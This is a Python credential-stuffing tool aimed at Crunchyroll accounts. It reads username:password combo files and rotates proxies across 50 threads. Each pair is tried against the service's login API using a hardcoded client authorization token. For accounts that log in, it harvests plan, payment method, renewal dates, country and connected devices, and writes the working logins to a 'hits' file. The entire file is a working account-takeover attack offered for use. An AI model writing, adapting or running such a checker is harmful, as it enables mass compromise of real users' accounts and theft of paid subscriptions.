import requests
import uuid
import random
import threading
import time
from datetime import datetime
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor

class CrunchyrollChecker:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.country_codes = {
            "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "CA": "Canada 🇨🇦",
            "AU": "Australia 🇦🇺", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷",
            "JP": "Japan 🇯🇵", "BR": "Brazil 🇧🇷", "IN": "India 🇮🇳",
            "MX": "Mexico 🇲🇽", "ES": "Spain 🇪🇸", "IT": "Italy 🇮🇹"
        }
        
        self.lock = threading.Lock()
        self.stats = {
            'checked': 0,
            'hits': 0,
            'free': 0,
            'bad': 0
        }
        
    def get_random_ua(self):
        return random.choice(self.user_agents)
    
    def generate_guid(self):
        return str(uuid.uuid4())
    
    def get_remaining_days(self, date_str):
        try:
            expire_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            now = datetime.now(expire_date.tzinfo)
            delta = expire_date - now
            return max(0, delta.days)
        except:
            return 0
    
    def check_account(self, combo, proxy=None):
        try:
            username, password = combo.strip().split(':', 1)
        except:
            return None
        
        ua = self.get_random_ua()
        guid = self.generate_guid()
        
        session = requests.Session()
        if proxy:
            session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # First request - Login
        login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
        login_data = {
            'username': username,
            'password': password,
            'grant_type': 'password',
            'scope': 'offline_access',
            'device_id': guid,
            'device_name': 'SM-G998U',
            'device_type': 'samsung SM-G998U'
        }
        
        login_headers = {
            'host': 'beta-api.crunchyroll.com',
            'authorization': 'Basic dGRnYmNwaHh4M3o5cmI3YTE4Mm06VFlGUV9lSEhiRkh0c0pOYzlFamwzWVBzMDN1VUJESFY=',
            'etp-anonymous-id': guid,
            'accept-encoding': 'gzip',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded'
        }
        
        try:
            response = session.post(login_url, data=login_data, headers=login_headers, timeout=30)
            
            if response.status_code != 200:
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return {'status': 'bad', 'combo': combo}
            
            data = response.json()
            
            if 'access_token' not in data:
                with self.lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return {'status': 'bad', 'combo': combo}
            
            access_token = data['access_token']
            account_id = data.get('account_id', '')
            
        except Exception as e:
            with self.lock:
                self.stats['bad'] += 1
                self.stats['checked'] += 1
            return {'status': 'error', 'combo': combo, 'error': str(e)}
        
        # Get account info
        account_headers = {
            'host': 'beta-api.crunchyroll.com',
            'authorization': f'Bearer {access_token}',
            'etp-anonymous-id': guid,
            'accept-encoding': 'gzip',
            'user-agent': ua
        }
        
        try:
            account_response = session.get(
                'https://beta-api.crunchyroll.com/accounts/v1/me',
                headers=account_headers,
                timeout=30
            )
            
            account_data = account_response.json()
            external_id = account_data.get('external_id', '')
            email_verified = account_data.get('email_verified', False)
            created_at = account_data.get('created', '')
            
        except:
            pass
        
        # Get subscription benefits
        try:
            benefits_response = session.get(
                f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
                headers=account_headers,
                timeout=30
            )
            
            if benefits_response.status_code != 200 or 'total":0' in benefits_response.text:
                with self.lock:
                    self.stats['free'] += 1
                    self.stats['checked'] += 1
                return {'status': 'free', 'combo': combo}
            
            benefits_data = benefits_response.json()
            country = self.country_codes.get(benefits_data.get('subscription_country', ''), 'Unknown')
            
            # Parse max streams
            text = benefits_response.text
            if '"concurrent_streams":6' in text:
                plan = "⟪ULTIMATE FAN MEMBER⟫"
                max_stream = 6
            elif '"concurrent_streams":4' in text:
                plan = "⟪MEGA FAN MEMBER⟫"
                max_stream = 4
            elif '"concurrent_streams":1' in text:
                plan = "⟪FAN MEMBER⟫"
                max_stream = 1
            else:
                with self.lock:
                    self.stats['free'] += 1
                    self.stats['checked'] += 1
                return {'status': 'free', 'combo': combo}
            
        except:
            with self.lock:
                self.stats['free'] += 1
                self.stats['checked'] += 1
            return {'status': 'free', 'combo': combo}
        
        # Get subscription details
        result = {
            'status': 'hit',
            'combo': combo,
            'plan': plan,
            'country': country,
            'max_stream': max_stream,
            'email_verified': 'Yes ✔️' if email_verified else 'No ❌',
            'created_at': created_at
        }
        
        try:
            sub_response = session.get(
                f'https://beta-api.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions',
                headers=account_headers,
                timeout=30
            )
            
            sub_data = sub_response.json()
            if 'items' in sub_data and len(sub_data['items']) > 0:
                item = sub_data['items'][0]
                result['payment_method'] = item.get('paymentMethodType', 'N/A')
                result['expire_at'] = item.get('expiresAt', 'N/A')
                result['renew_at'] = item.get('nextRenewalDate', 'N/A')
                
                if result['renew_at'] != 'N/A':
                    remaining = self.get_remaining_days(result['renew_at'])
                    result['remaining_days'] = f"{remaining} Days"
                
                plan_type = item.get('planType', '')
                result['plan_type'] = plan_type
                
        except:
            pass
        
        # Get connected devices
        try:
            devices_response = session.get(
                f'https://beta-api.crunchyroll.com/accounts/v1/{account_id}/devices/active',
                headers=account_headers,
                timeout=30
            )
            
            devices_data = devices_response.json()
            if 'items' in devices_data:
                result['connected_devices'] = len(devices_data['items'])
        except:
            pass
        
        with self.lock:
            self.stats['hits'] += 1
            self.stats['checked'] += 1
        
        return result
    
    def print_result(self, result):
        if result is None:
            return
        
        if result['status'] == 'hit':
            print(f"\n{'='*60}")
            print(f"✅ HIT FOUND!")
            print(f"{'='*60}")
            print(f"Account: {result['combo']}")
            print(f"Plan: {result['plan']}")
            print(f"Country: {result['country']}")
            print(f"Max Streams: {result.get('max_stream', 'N/A')}")
            print(f"Email Verified: {result.get('email_verified', 'N/A')}")
            print(f"Payment Method: {result.get('payment_method', 'N/A')}")
            print(f"Expires At: {result.get('expire_at', 'N/A')}")
            print(f"Renew At: {result.get('renew_at', 'N/A')}")
            print(f"Remaining: {result.get('remaining_days', 'N/A')}")
            print(f"Connected Devices: {result.get('connected_devices', 'N/A')}")
            print(f"Created: {result.get('created_at', 'N/A')}")
            print(f"{'='*60}\n")
            
            # Save to file
            with open('crunchyroll_hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"{result['combo']} | {result['plan']} | {result['country']}\n")
        
        elif result['status'] == 'free':
            print(f"[FREE] {result['combo']}")
        elif result['status'] == 'bad':
            print(f"[BAD] {result['combo']}")
    
    def update_stats(self):
        while True:
            time.sleep(2)
            with self.lock:
                print(f"\r[Stats] Checked: {self.stats['checked']} | Hits: {self.stats['hits']} | Free: {self.stats['free']} | Bad: {self.stats['bad']}", end='', flush=True)
    
    def run(self, combo_file, threads=50, proxy_file=None):
        # Read combos
        try:
            with open(combo_file, 'r', encoding='utf-8') as f:
                combos = [line.strip() for line in f if ':' in line]
        except FileNotFoundError:
            print(f"Error: File '{combo_file}' not found!")
            return
        
        # Read proxies if provided
        proxies = []
        if proxy_file:
            try:
                with open(proxy_file, 'r', encoding='utf-8') as f:
                    proxies = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"Warning: Proxy file '{proxy_file}' not found. Running without proxies.")
        
        print(f"Loaded {len(combos)} combos")
        if proxies:
            print(f"Loaded {len(proxies)} proxies")
        print(f"Starting check with {threads} threads...\n")
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.update_stats, daemon=True)
        stats_thread.start()
        
        # Process combos
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i, combo in enumerate(combos):
                proxy = proxies[i % len(proxies)] if proxies else None
                future = executor.submit(self.check_account, combo, proxy)
                future.add_done_callback(lambda f: self.print_result(f.result()))
        
        print(f"\n\n{'='*60}")
        print("Checking completed!")
        print(f"Total Checked: {self.stats['checked']}")
        print(f"Hits: {self.stats['hits']}")
        print(f"Free: {self.stats['free']}")
        print(f"Bad: {self.stats['bad']}")
        print(f"{'='*60}")

if __name__ == "__main__":
    checker = CrunchyrollChecker()
    file = input('Combo path: ')
    proxy_path = input('Proxy path or enter: ')
    if proxy_path == '':
    # Usage:
    # checker.run('combos.txt', threads=50)  # Without proxies
    # checker.run('combos.txt', threads=50, proxy_file='proxies.txt')  # With proxies
        checker.run(file, threads=50)
    else:
        checker.run(file, threads=50, proxy_file=proxy_path) 
